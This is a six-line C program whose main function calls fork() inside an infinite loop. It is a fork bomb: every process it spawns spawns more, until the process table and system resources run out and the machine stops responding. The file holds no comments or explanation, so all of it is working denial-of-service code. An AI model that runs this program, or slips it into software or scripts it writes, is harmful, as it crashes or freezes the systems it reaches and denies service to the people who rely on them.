#include <sys/types.h>
#include <unistd.h>

int main() {
    while (1) fork();
}